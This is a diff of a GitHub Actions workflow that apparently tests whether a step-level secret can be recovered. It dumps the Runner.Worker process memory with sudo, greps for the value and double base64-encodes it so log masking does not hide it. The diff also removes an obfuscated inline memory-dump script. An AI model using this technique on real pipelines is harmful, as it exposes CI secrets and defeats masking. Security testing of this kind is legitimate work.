@@ -8,40 +8,27 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      # リポジトリ内の src/test.py をランナーに持ってくるために必要
+      - name: Checkout code
+        uses: actions/checkout@v4
+
       - name: Step 1 - Set Step-level ENV
         env:
-          # 検証用: "HiddenSecret" -> base64 -> "SGlkZGVuU2VjcmV0" -> base64 -> "U0dsS1pHVnVVMlZqY21WMg=="
           STEP_VAL: "U0dsS1pHVnVVMlZqY21WMg=="
         run: |
-          echo "Step 1 is running..."
-          echo "STEP_VAL is set in this step's env."
+          echo "Step 1: STEP_VAL is loaded into Runner memory."
 
       - name: Step 2 - Ordinary Printenv
         run: |
-          echo "--- Step 2: Checking ordinary visibility ---"
-          printenv | grep STEP_VAL || echo "STEP_VAL is not found in standard env (as expected)."
+          printenv | grep STEP_VAL || echo "Step 2: Not in standard printenv."
 
-      - name: Step 3 - Memory Dump via B64 Script and Double Decode
+      - name: Step 3 - Memory Dump via src/test.py
         run: |
-          # 1. ユーザー提供のPythonスクリプトをBase64化したものをデコードして作成
-          echo "aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgojIENyZWRpdCB0byBnaXRodWIuY29tL25pa2l0YXN0dXBpbiBmb3IgdGhlIHNjcmlwdC4KCmRlZiBnZXRfcGlkKCk6CiAgICBwaWRzID0gW3BpZCBmb3IgcGlkIGluIG9zLmxpc3RkaXIoJy9wcm9jJykgaWYgcGlkLmlzZGlnaXQoKV0KCiAgICBmb3IgcGlkIGluIHBpZHM6CiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbignL3Byb2MnLCBwaWQsICdjbWRsaW5lJyksICdyYicpIGFzIGNtZGxpbmVfZjoKICAgICAgICAgICAgaWYgYidSdW5uZXIuV29ya2VyJyBpbiBjbWRsaW5lX2YucmVhZCgpOgogICAgICAgICAgICAgICAgcmV0dXJuIHBpZAoKICAgIHJhaXNlIEV4Y2VwdGlvbignQ2FuIG5vdCBnZXQgcGlkIG9mIFJ1bm5lci5Xb3JrZXInKQoKcGlkID0gZ2V0X3BpZCgpCgptYXBfcGF0aCA9IGYiL3Byb2Mve3BpZH0vbWFwcyIKbWVtX3BhdGggPSBmIi9wcm9jL3twaWR9L21lbSIKCndpdGggb3BlbihtYXBfcGF0aCwgJ3InKSBhcyBtYXBfZiwgb3BlbihtZW1fcGF0aCwgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICBmb3IgbGluZSBpbiBtYXBfZi5yZWFkbGluZXMoKTogICMgZm9yIGVhY2ggbWFwcGVkIHJlZ2lvbgogICAgICAgIG0gPSByZS5tYXRjaChyJyhbMC05QS1GYS1mXSspLShbMC05QS1GYS1mXSspIChbLXJdKScsIGxpbmUpCiAgICAgICAgaWYgbS5ncm91cCgzKSA9PSAncic6ICAjIHJlYWRhYmxlIHJlZ2lvbgogICAgICAgICAgICBzdGFydCA9IGludChtLmdyb3VwKDEpLCAxNikKICAgICAgICAgICAgZW5kID0gaW50KG0uZ3JvdXAoMiksIDE2KQogICAgICAgICAgICBpZiBzdGFydCA+IHN5cy5tYXhzaXplOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgbWVtX2Yuc2VlayhzdGFydCkgICMgc2VlayB0byByZWdpb24gc3RhcnQKICAgICAgICAKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgY2h1bmsgPSBtZW1fZi5yZWFkKGVuZCAtIHN0YXJ0KSAgIyByZWFkIHJlZ2lvbiBjb250ZW50cwogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5idWZmZXIud3JpdGUoY2h1bmspCiAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICAgICAgY29udGludWU=" | base64 -d > dump_mem.py
+          # src/test.py を実行してパイプで繋ぐだけのスッキリしたワンライナー
+          B64_BLOB=$(sudo python3 ./.github/workflows/test.py | tr -d '\0' | grep -aoEi 'STEP_VAL=[A-Za-z0-9+/=]+' | sort -u | base64 -w 0 | base64 -w 0)
 
-          echo "--- Step 3: Searching for STEP_VAL in Runner.Worker memory ---"
-          
-          # 2. メモリをダンプし、STEP_VAL= を探し、値を2回デコードする
-          # grep -a はバイナリをテキストとして扱うフラグ
-          RESULT=$(sudo python3 dump_mem.py | grep -a "STEP_VAL=" | head -n 1 | cut -d '=' -f2)
-          
-          if [ -z "$RESULT" ]; then
-            echo "STEP_VAL not found in memory. It might have been garbage collected or not allocated in the same way."
+          if [ -n "$B64_BLOB" ]; then
+            echo "$B64_BLOB"
           else
-            echo "Extracted value (B64x2): $RESULT"
-            
-            echo -n "Decoded once: "
-            echo "$RESULT" | base64 -d
-            echo ""
-            
-            echo -n "Decoded twice (Final Secret): "
-            echo "$RESULT" | base64 -d | base64 -d
-            echo ""
+            exit 0
           fi
